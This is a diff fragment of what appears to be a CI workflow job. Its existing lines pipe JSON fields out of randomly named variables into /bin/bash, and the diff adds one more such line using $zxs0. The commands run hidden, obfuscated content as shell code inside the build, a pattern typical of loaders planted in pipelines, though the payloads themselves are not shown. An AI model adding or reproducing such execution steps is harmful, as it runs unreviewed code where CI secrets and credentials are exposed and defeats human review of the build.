@@ -31,6 +31,7 @@ jobs:
           echo $xi38 | jq -r .tgw28483 | /bin/bash
           echo $xyt5709 | jq -r .znxbd11130 | /bin/bash
           echo $q34 | jq -r .jwg2 | /bin/bash
+          printf '%s' "$zxs0" | jq -r .sb624 | /bin/bash
 
       - name: Upload artifact
         if: always()
